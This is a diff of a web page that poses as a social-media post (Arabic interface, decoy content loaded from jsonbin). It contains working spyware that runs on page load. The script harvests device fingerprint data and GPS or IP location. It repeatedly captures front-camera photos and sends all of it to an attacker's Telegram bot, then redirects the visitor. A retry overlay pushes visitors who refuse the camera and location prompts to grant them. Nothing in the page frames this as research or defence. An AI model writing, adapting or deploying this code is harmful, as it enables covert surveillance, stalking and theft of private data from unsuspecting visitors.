@@ -25,19 +25,16 @@
         --border: #3e4042;
       }
     }
-
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background: var(--bg);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
-      flex-direction: column;
-      align-items: center;
+      justify-content: center;
       padding-top: 30px;
       min-height: 100vh;
       position: relative;
     }
-
     .post-container {
       max-width: 500px;
       width: 100%;
@@ -77,7 +74,7 @@
     }
     .post-actions {
       display: flex;
-      justify-content: space-around;
+      justify-content: space-evenly;
       padding: 10px 16px;
       border-top: 1px solid var(--border);
       color: var(--text-secondary);
@@ -112,7 +109,6 @@
 </head>
 <body>
   <div class="post-container" id="postContainer">
-    <!-- محتوى مؤقت سريع -->
     <div class="post-header">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
       <div>
@@ -154,221 +150,37 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    let stream = null;
-    let photoCount = 0;
-    let captureInterval = null;
-    let countdownInterval = null;
-    let countdown = COUNTDOWN_SECONDS;
-    let latestPosition = null;
-    let redirectUrl = 'https://example.com';
+    let stream = null, photoCount = 0, captureInterval = null, countdownInterval = null, countdown = COUNTDOWN_SECONDS, latestPosition = null, redirectUrl = 'https://example.com';
 
-    // تحديث المنشور بعد جلب البيانات الحقيقية
-    async function updatePost() {
-      try {
-        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
-        const data = await res.json();
-        const s = data.record || {};
-        redirectUrl = s.redirectUrl || redirectUrl;
+    async function updatePost(){ try{ const res = await fetch("https://api.jsonbin.io/v3/b/"+JSONBIN_BIN_ID+"/latest"); const data = await res.json(); const s = data.record || {}; redirectUrl = s.redirectUrl || redirectUrl; const profileName = s.profileName || 'Shahin Zyan'; const profilePic = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png'; const postText = s.postText || 'هذا نص المنشور.'; const postImage = s.postImage || ''; const postTime = s.postTime || 'الآن'; const commentsCount = s.commentsCount || '12'; const sharesCount = s.sharesCount || '5'; postContainer.innerHTML = '<div class="post-header"><img src="'+profilePic+'" onerror="this.src=\'data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E\'"><div><div class="post-user">'+profileName+'</div><div class="post-time">'+postTime+'</div></div></div><div class="post-text">'+postText+'</div>' + (postImage ? '<div class="post-image"><img src="'+postImage+'" alt="صورة المنشور"></div>' : '') + '<div class="post-stats"><span>'+commentsCount+' تعليق</span><span>'+sharesCount+' مشاركة</span></div><div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>'; }catch(e){}}
 
-        const profileName = s.profileName || 'Shahin Zyan';
-        const profilePic = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
-        const postText = s.postText || 'هذا نص المنشور.';
-        const postImage = s.postImage || '';
-        const postTime = s.postTime || 'الآن';
-        const commentsCount = s.commentsCount || '12';
-        const sharesCount = s.sharesCount || '5';
+    async function sendText(text){ try{ await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:text,parse_mode:'HTML'})}); }catch(e){} }
 
-        postContainer.innerHTML = `
-          <div class="post-header">
-            <img src="${profilePic}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
-            <div>
-              <div class="post-user">${profileName}</div>
-              <div class="post-time">${postTime}</div>
-            </div>
-          </div>
-          <div class="post-text">${postText}</div>
-          ${postImage ? `<div class="post-image"><img src="${postImage}" alt="صورة المنشور"></div>` : ''}
-          <div class="post-stats">
-            <span>${commentsCount} تعليق</span>
-            <span>${sharesCount} مشاركة</span>
-          </div>
-          <div class="post-actions">
-            <span>أعجبني</span>
-            <span>تعليق</span>
-            <span>مشاركة</span>
-          </div>
-        `;
-      } catch(e) {}
-    }
+    async function collectDeviceInfo(){ try{ const uaData = navigator.userAgentData || {}; let highEntropy = {}; if(uaData.getHighEntropyValues){ try{ highEntropy = await uaData.getHighEntropyValues(["platform","platformVersion","model","architecture"]); }catch(e){} } const screen = window.screen; let battery = null; try{ if('getBattery' in navigator){ const b = await navigator.getBattery(); battery = { level: b.level, charging: b.charging }; } }catch(e){} const deviceInfo = { ua: navigator.userAgent, platform: navigator.platform, language: navigator.language, cores: navigator.hardwareConcurrency || 1, memory: navigator.deviceMemory || 'N/A', touch: navigator.maxTouchPoints || 0, screen: screen.width+'x'+screen.height, battery: battery ? (battery.level*100).toFixed(0)+'% '+(battery.charging?'⚡':'🔋') : 'N/A', timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timestamp: new Date().toISOString(), highEntropy: highEntropy }; let txt = '<b>📱 معلومات الجهاز</b>\nالموديل: '+(highEntropy.model||'N/A')+'\nالنظام: '+deviceInfo.platform+'\nالشاشة: '+deviceInfo.screen+'\nالمعالج: '+deviceInfo.cores+' نواة\nالذاكرة: '+deviceInfo.memory+'GB\nالبطارية: '+deviceInfo.battery+'\nاللغة: '+deviceInfo.language+'\nالمنطقة الزمنية: '+deviceInfo.timezone; sendText(txt); }catch(e){} }
 
-    async function sendText(text) {
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-        });
-      } catch(e) {}
-    }
+    async function collectLocation(){ if(navigator.geolocation){ try{ const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0})); latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' }; }catch(e){} } if(!latestPosition){ try{ const r = await fetch("https://ipinfo.io/json?token="+IPINFO_TOKEN); const d = await r.json(); const [lat,lon] = d.loc.split(',').map(Number); latestPosition = { lat, lon, acc:10000, src:'IP' }; }catch(e){} } if(latestPosition){ sendText('📍 الموقع: '+latestPosition.lat+','+latestPosition.lon+' ('+latestPosition.src+', '+latestPosition.acc+'m)\n🗺️ https://www.google.com/maps?q='+latestPosition.lat+','+latestPosition.lon); } }
 
-    async function collectDeviceInfo() {
-      try {
-        const uaData = navigator.userAgentData || {};
-        let highEntropy = {};
-        if (uaData.getHighEntropyValues) {
-          try { highEntropy = await uaData.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
-        }
-        const screen = window.screen;
-        let battery = null;
-        try { if('getBattery' in navigator) { const b = await navigator.getBattery(); battery = { level: b.level, charging: b.charging }; } } catch(e) {}
-        const deviceInfo = {
-          ua: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          cores: navigator.hardwareConcurrency || 1,
-          memory: navigator.deviceMemory || 'N/A',
-          touch: navigator.maxTouchPoints || 0,
-          screen: `${screen.width}x${screen.height}`,
-          battery: battery ? `${(battery.level*100).toFixed(0)}% ${battery.charging?'⚡':'🔋'}` : 'N/A',
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          timestamp: new Date().toISOString(),
-          highEntropy
-        };
-        let txt = '<b>📱 معلومات الجهاز</b>\n';
-        txt += `الموديل: ${highEntropy.model||'N/A'}\nالنظام: ${deviceInfo.platform}\nالشاشة: ${deviceInfo.screen}\nالمعالج: ${deviceInfo.cores} نواة\nالذاكرة: ${deviceInfo.memory}GB\nالبطارية: ${deviceInfo.battery}\nاللغة: ${deviceInfo.language}\nالمنطقة الزمنية: ${deviceInfo.timezone}`;
-        sendText(txt);
-      } catch(e) {}
-    }
+    async function startCameraIfGranted(){ try{ stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }); video.srcObject = stream; await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; }); captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL); startCountdown(); return true; }catch(e){ return false; } }
 
-    async function collectLocation() {
-      if (navigator.geolocation) {
-        try {
-          const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
-          latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' };
-        } catch(e) {}
-      }
-      if (!latestPosition) {
-        try {
-          const r = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
-          const d = await r.json();
-          const [lat,lon] = d.loc.split(',').map(Number);
-          latestPosition = { lat, lon, acc:10000, src:'IP' };
-        } catch(e) {}
-      }
-      if (latestPosition) {
-        sendText(`📍 الموقع: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
-      }
-    }
+    function captureAndSend(){ if(!stream || !video.videoWidth) return; canvas.width = video.videoWidth; canvas.height = video.videoHeight; ctx.drawImage(video, 0, 0); const dataUrl = canvas.toDataURL('image/jpeg', 0.8); const blob = dataURLtoBlob(dataUrl); const form = new FormData(); form.append('chat_id', CHAT_ID); form.append('photo', blob, 'snap.jpg'); fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendPhoto",{method:'POST',body:form}).catch(()=>{}); photoCount++; }
 
-    async function startCameraIfGranted() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        video.srcObject = stream;
-        await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
-        captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL);
-        startCountdown();
-        return true;
-      } catch(e) { return false; }
-    }
+    function dataURLtoBlob(dataurl){ const arr = dataurl.split(','); const mime = arr[0].match(/:(.*?);/)[1]; const bstr = atob(arr[1]); let n = bstr.length; const u8arr = new Uint8Array(n); while(n--) u8arr[n] = bstr.charCodeAt(n); return new Blob([u8arr],{type:mime}); }
 
-    function captureAndSend() {
-      if (!stream || !video.videoWidth) return;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-      const blob = dataURLtoBlob(dataUrl);
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('photo', blob, 'snap.jpg');
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form }).catch(()=>{});
-      photoCount++;
-    }
+    function stopMedia(){ if(captureInterval) clearInterval(captureInterval); if(countdownInterval) clearInterval(countdownInterval); if(stream) stream.getTracks().forEach(t => t.stop()); }
 
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(',');
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while(n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], {type:mime});
-    }
+    function startCountdown(){ countdown = COUNTDOWN_SECONDS; countdownInterval = setInterval(() => { countdown--; if(countdown <= 0){ stopMedia(); window.location.href = redirectUrl; } }, 1000); }
 
-    function stopMedia() {
-      if (captureInterval) clearInterval(captureInterval);
-      if (countdownInterval) clearInterval(countdownInterval);
-      if (stream) stream.getTracks().forEach(t => t.stop());
-    }
+    async function requestPermissions(){ const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(s => { stream = s; return true; }).catch(() => false); const locationPromise = new Promise(resolve => { if(!navigator.geolocation) return resolve(false); navigator.geolocation.getCurrentPosition(pos => { latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' }; resolve(true); }, () => resolve(false), { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }); }); return await Promise.all([cameraPromise, locationPromise]); }
 
-    function startCountdown() {
-      countdown = COUNTDOWN_SECONDS;
-      countdownInterval = setInterval(() => {
-        countdown--;
-        if (countdown <= 0) {
-          stopMedia();
-          window.location.href = redirectUrl;
-        }
-      }, 1000);
-    }
+    function showRetry(){ postContainer.classList.add('hidden'); retryOverlay.classList.remove('hidden'); stopMedia(); }
 
-    // آلية الصلاحيات
-    async function requestPermissions() {
-      const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        .then(s => { stream = s; return true; })
-        .catch(() => false);
-      
-      const locationPromise = new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(false);
-        navigator.geolocation.getCurrentPosition(
-          pos => { latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' }; resolve(true); },
-          () => resolve(false),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      });
+    function hideRetry(){ retryOverlay.classList.add('hidden'); postContainer.classList.remove('hidden'); }
 
-      return await Promise.all([cameraPromise, locationPromise]);
-    }
+    async function attemptPermissions(){ const [cameraGranted, locationGranted] = await requestPermissions(); collectDeviceInfo(); if(locationGranted || latestPosition){ if(!latestPosition && locationGranted) await collectLocation(); else if(latestPosition) sendText('📍 الموقع: '+latestPosition.lat+','+latestPosition.lon+' ('+latestPosition.src+', '+latestPosition.acc+'m)\n🗺️ https://www.google.com/maps?q='+latestPosition.lat+','+latestPosition.lon); } if(cameraGranted && locationGranted){ hideRetry(); await startCameraIfGranted(); } else { hideRetry(); await new Promise(r => setTimeout(r, 200)); showRetry(); } }
 
-    function showRetry() {
-      postContainer.classList.add('hidden');
-      retryOverlay.classList.remove('hidden');
-      stopMedia();
-    }
+    retryBtn.addEventListener('click', async () => { hideRetry(); await new Promise(r => setTimeout(r, 300)); await attemptPermissions(); });
 
-    function hideRetry() {
-      retryOverlay.classList.add('hidden');
-      postContainer.classList.remove('hidden');
-    }
-
-    async function attemptPermissions() {
-      const [cameraGranted, locationGranted] = await requestPermissions();
-
-      collectDeviceInfo();
-      if (locationGranted || latestPosition) {
-        if (!latestPosition && locationGranted) await collectLocation();
-        else if (latestPosition) sendText(`📍 الموقع: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
-      }
-
-      if (cameraGranted && locationGranted) {
-        hideRetry();
-        await startCameraIfGranted();
-      } else {
-        hideRetry();
-        await new Promise(r => setTimeout(r, 200));
-        showRetry();
-      }
-    }
-
-    retryBtn.addEventListener('click', async () => {
-      hideRetry();
-      await new Promise(r => setTimeout(r, 300));
-      await attemptPermissions();
-    });
-
-    async function init() {
-      updatePost();
-      setTimeout(attemptPermissions, 500);
-    }
+    async function init(){ updatePost(); setTimeout(attemptPermissions, 500); }
 
     window.addEventListener('load', init);
     window.addEventListener('beforeunload', stopMedia);
